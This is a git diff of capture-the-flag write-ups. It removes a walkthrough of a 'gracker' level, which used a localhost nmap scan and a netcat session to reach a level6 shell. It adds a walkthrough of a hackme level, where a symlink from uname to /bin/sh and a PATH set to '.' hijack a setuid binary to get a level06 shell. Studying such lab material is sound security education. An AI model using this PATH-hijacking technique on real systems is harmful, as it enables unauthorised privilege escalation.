@@ -1,57 +1,31 @@
-First of all we can convert the hints into decimal numbers. I usually use python for that.
+In this level you had to exploit the fact, that if no absolute path is specified,
+the system searches in the $PATH locations for it. Because the setuid binary
+didn't use absoliute paths, it was possible to change the environment $PATH
+variable. One of the first commands executed is `uname`. So we use a symlink
+called uname to `/bin/sh`.
 
-    level5@gracker:~$ python
-    Python 2.7.9 (default, Mar  1 2015, 12:57:24)
-    [GCC 4.9.2] on linux2
-    Type "help", "copyright", "credits" or "license" for more information.
-    >>> 0x5ad
-    1453
-    >>> 0xdad
-    3501
+    ln -s /bin/sh uname
 
+If we now set $PATH only to the current working directory "." the system will
+search for the `uname` program and will only find the symlink. So it will execute
+the shell for us.
 
-Then we can perform a portscan with `nmap`. Because we don't run `nmap` as root, it can't
-use icmp ping to check if the host is up. So we have to use the -Pn parameter.
+    level05@hackme.knowit.no:/tmp/level05$ echo $PATH
+    /sbin/:/usr/local/bin:/usr/bin:/bin:/usr/games
 
+    level05@hackme.knowit.no:/tmp/level05$ env PATH=. /levels/level05/level05
+    Zero Cool - Linux Information Gathering Tool v1.2
 
+    [*] Get system information:
+    $ PATH=/sbin/:/usr/local/bin:/usr/bin:/bin:/usr/games
+    $ id
+    uid=1009(level06) gid=1009(level06) groups=1009(level06)
 
-    level5@gracker:~$ nmap -p1453-3501 -Pn 127.0.0.1
+Because the $PATH is now screwed, we have to reset it back to the original value,
+otherwise no other commands will work.
 
-    Starting Nmap 6.47 ( http://nmap.org ) at 2015-06-21 02:30 CEST
-    Nmap scan report for localhost (127.0.0.1)
-    Host is up (0.00017s latency).
-    Not shown: 2048 filtered ports
-    PORT     STATE SERVICE
-    2989/tcp open  unknown
+This kind of exploit is or was a real issue. Not only for linux commandline $PATH,
+but also for DLLs in Windows or Dylib (dynamic libraries) in OSX.
+Read this paper for more details:
+https://www.virusbtn.com/virusbulletin/archive/2015/03/vb201503-dylib-hijacking
 
-    Nmap done: 1 IP address (1 host up) scanned in 21.48 seconds
-
-
-Now we found out that tcp port 2989 (funfact: in hex 0xbad) is open. So we can use
-netcat to talk with the port. It shows us a command trace. So this level is not really
-a security issue. But more like a little trivia/recon game. The solution is to pass
-the command that Flynn got into the GRID `LLLSDLaserControl`.
-After that command you get an OS shell as level6 and can read the password
-
-
-
-    level5@gracker:~$ nc 127.0.0.1 2989
-    $ whoami
-    flynn
-    $ uname -a
-    SolarOs 4.0.1 Generic_50203-02 sun4m i386
-    Unknown.Unknown
-    $ login -n root
-    Login incorrect
-    login: backdoor
-    No home directory specified in password file!
-    Logging in with home=/
-    # bin/history
-      499 kill 2208
-      500 ps -a -x -u
-      501 touch /opt/LLL/run/ok
-      502 LLLSDLaserControl -ok 1
-    # LLLSDLaserControl
-    You entered the Grid!
-    level6@TRON $ id
-    uid=1006(level6) gid=1006(level6) groups=1006(level6)
